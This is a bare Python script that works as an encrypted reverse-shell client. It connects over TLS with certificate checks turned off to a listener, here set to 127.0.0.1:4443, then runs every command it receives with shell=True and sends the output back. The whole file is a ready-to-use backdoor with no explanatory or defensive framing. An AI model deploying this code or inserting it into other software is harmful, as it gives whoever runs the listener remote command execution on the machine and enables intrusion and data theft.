import socket
import ssl
import subprocess

HOST = '127.0.0.1'
PORT = 4443

context = ssl.create_default_context()
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

with socket.create_connection((HOST, PORT)) as sock:
    with context.wrap_socket(sock, server_hostname=HOST) as ssock:
        print("[+] Connected to server.")
        while True:
            try:
                command = ssock.recv(1024).decode()
                if not command:
                    break
                if command.lower() == "exit":
                    break
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                output = result.stdout + result.stderr
                ssock.sendall(output.encode())
            except Exception as e:
                ssock.sendall(str(e).encode())
